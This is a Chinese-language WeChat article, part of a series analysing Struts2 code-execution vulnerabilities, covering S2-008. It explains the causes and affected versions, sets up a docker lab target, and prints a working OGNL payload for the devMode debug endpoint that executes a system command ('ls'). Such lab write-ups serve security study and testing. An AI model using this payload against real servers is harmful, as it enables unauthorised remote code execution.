<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/fWKwAW0JdeaTltSv_6aGMw)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)  

> **文章来****源：**

**【Struts2 - 命令 - 代码执行漏洞分析系列】 S2-008** 

**漏洞概述**  
S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。

  
**漏洞成因**

主要利用对传入参数没有严格限制，导致多个地方可以执行恶意代码。

  
第一种情况其实就是 S2-007，在异常处理时的 OGNL 执行 第二种的 cookie 的方式，虽然在 struts2 没有对恶意代码进行限制，但是 java 的 webserver（Tomcat），对 cookie 的名称有较多限制，在传入 struts2 之前就被处理，从而较为鸡肋 第三种需要开启 devModedebug 模式  
例如在 devMode 模式下直接添加参数 ?debug=command&expression= 会直接执行后面的 OGNL 表达式.

  
**影响版本：**

Struts 2.1.0 - Struts 2.3.1

  
**环境搭建：**  
docker-compose up-d/docker-compose build  
启动靶场。

  
 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0bumFzNNm3zc9DLWJhk26icbYibkEerVm26gJicEs5KLVm21O72iadj6QyjoX4HlY7cXHRRYLdOhbFw/640?wx_fmt=png)   

靶场已经启动可以通过访问虚拟机 IP 进行访问

  
 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0bumFzNNm3zc9DLWJhk26E7R9xoqMP7EibhItpUcADJxXQkHb7AhIuia0Kr0ibiawrOt3eViaDAciap6Q/640?wx_fmt=png)   

选择 devmode,jsp

  
 ![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0bumFzNNm3zc9DLWJhk26WS3DqGQJZPoWL76jdp3saCDaynmwhG8SHaiashoSIfibEa7wGgiceSRyg/640?wx_fmt=png)   

命令执行：  

```
/devmode.action?debug=command&expression=(#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ls').getInputStream()))
```

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0bumFzNNm3zc9DLWJhk26IPXMdnKbVRW8K8l5KQPTaM7xFPlkcFoES93GFORVLicQPH0tn6JEveg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

推荐文章 ++++

![](https://mmbiz.qpic.cn/mmbiz_jpg/US10Gcd0tQFGib3mCxJr4oMx1yp1ExzTETemWvK6Zkd7tVl23CVBppz63sRECqYNkQsonScb65VaG9yU2YJibxNA/640?wx_fmt=jpeg)

*[【Struts2 - 命令 - 代码执行漏洞分析系列】 S2-001](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650496978&idx=3&sn=8e7b2b7caacf9bc393b2128989b69790&chksm=83ba3a36b4cdb3201dcdd5e50d2c6600d204f870601e8d63958588c0d6062d9648db7db7b9d9&scene=21#wechat_redirect)  

*[【Struts2 - 命令 - 代码执行漏洞分析系列】 S2-005](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650498316&idx=3&sn=0ae5551dafcef0e8926a580c834acb05&chksm=83ba00e8b4cd89feaae6e5aeb149fdde0f237231ef88506dbd070ac4aae1c013ad75510a7f17&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)